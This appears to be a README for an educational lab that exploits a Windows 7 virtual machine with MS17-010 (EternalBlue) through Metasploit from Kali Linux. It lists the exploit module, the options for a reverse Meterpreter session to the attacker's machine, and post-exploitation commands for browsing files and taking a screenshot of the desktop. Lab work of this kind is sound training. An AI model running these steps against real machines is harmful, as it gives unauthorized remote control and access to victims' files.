________________________________________
Project Title:
Exploiting Windows 7 (MS17-010 EternalBlue) – Educational Lab
________________________________________
Project Description:
This project demonstrates an educational penetration testing lab where a vulnerable Windows 7 virtual machine is exploited from Kali Linux using the MS17-010 (EternalBlue) vulnerability via Metasploit.
The purpose of this project is learning and practicing ethical hacking techniques in a controlled virtual environment only.
________________________________________
Lab Environment:
•	Attacker Machine: Kali Linux (Virtual Machine)
•	Target Machine: Windows 7 (Virtual Machine)
•	Tool: Metasploit Framework
•	Vulnerability: MS17-010 (EternalBlue)
•	Protocol: SMB
•	Port: 445
•	Network: Internal / Host-only (Virtual Network)
________________________________________
 Steps Demonstrated in the Video:
# 1) Get IP address of Windows 7
ipconfig

# 2) Get IP address of Kali Linux
ifconfig

# 3) Test connectivity from Kali to Windows
ping <Windows_IP>

# 4) Start Metasploit Framework
msfconsole

# 5) Use EternalBlue exploit (MS17-010)
use exploit/windows/smb/ms17_010_eternalblue

# 6) Configure exploit options
set RHOSTS <Windows_IP>
set LHOST <Kali_IP>
set LPORT <Listening_Port>

# 7) Run the exploit
run

# 8) Post-exploitation commands (Meterpreter)
Pwd
cd Documents
ls

# 9) Take a screenshot of Windows desktop
screenshot

# Lab Video Demo 2

This video shows the lab experiment.

[Download / Watch Video](https://drive.google.com/file/d/1zSJNYlOfh5LBvr8_eTzsIQTvsRYKuSWl/view?usp=sharing)